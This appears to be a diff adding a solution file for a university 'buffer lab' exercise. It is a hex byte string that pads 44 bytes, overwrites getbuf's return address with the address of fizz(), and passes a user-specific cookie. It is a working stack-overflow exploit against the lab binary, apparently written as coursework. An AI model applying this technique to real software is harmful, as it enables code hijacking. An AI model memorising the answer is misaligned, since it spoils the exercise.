@@ -1,0 +1,10 @@
+/* getbuf return address at address: 0x55683494 <_reserved+1037460> */
+/* Local buffer starts at address:   0x55683468 <_reserved+1037416> */
+/* Padding required:                 44 bytes */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* fizz() located at: 0x08048cba */
+ba 8c 04 08
+00 00 00 00
+/* cookie for user  linuxer computed as: 0x3b13c308 */
+08 c3 13 3b
